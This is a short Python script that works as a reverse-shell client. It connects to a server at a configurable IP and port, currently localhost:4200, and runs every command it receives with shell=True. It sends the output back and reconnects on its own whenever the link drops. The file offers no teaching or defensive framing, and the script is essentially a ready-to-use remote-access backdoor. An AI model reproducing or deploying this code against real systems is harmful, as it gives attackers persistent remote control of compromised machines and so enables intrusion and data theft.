import socket
import subprocess
import time
import os

SERVER_IP = "localhost"  
PORT = 4200

current_dir = os.getcwd()  # Start in the default directory

def execute(cmd):
    global current_dir
    cmd = cmd.strip()
    if not cmd:
        return ""
    # Handle 'cd' command
    if cmd.startswith("cd "):
        path = cmd[3:].strip()
        try:
            os.chdir(path)
            current_dir = os.getcwd()
            return f"Changed directory to {current_dir}"
        except Exception as e:
            return f"cd: {e}"
    else:
        try:
            result = subprocess.check_output(
                cmd, 
                stderr=subprocess.STDOUT, 
                shell=True, 
                cwd=current_dir  # Run in the tracked directory
            )
            return result.decode("utf-8")
        except subprocess.CalledProcessError as e:
            return f"Command failed: {e.output.decode('utf-8')}"
        except Exception as e:
            return f"Error: {str(e)}"

def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, PORT))
            print("[*] Connected to server")
            return client
        except ConnectionRefusedError:
            print("[-] Server unavailable. Retrying in 10s...")
            time.sleep(10)

client = connect_to_server()

while True:
    try:
        command = client.recv(4096).decode("utf-8")
        if not command:
            raise ConnectionError("Connection closed")
            
        print(f"[+] Received command: {command}")
        result = execute(command)
        
        if result:
            client.send(result.encode("utf-8"))
    except (ConnectionResetError, ConnectionAbortedError, ConnectionError):
        print("[-] Connection lost. Reconnecting...")
        client = connect_to_server()
    except Exception as e:
        print(f"Critical error: {str(e)}")
        client.close()
        time.sleep(5)
        client = connect_to_server()
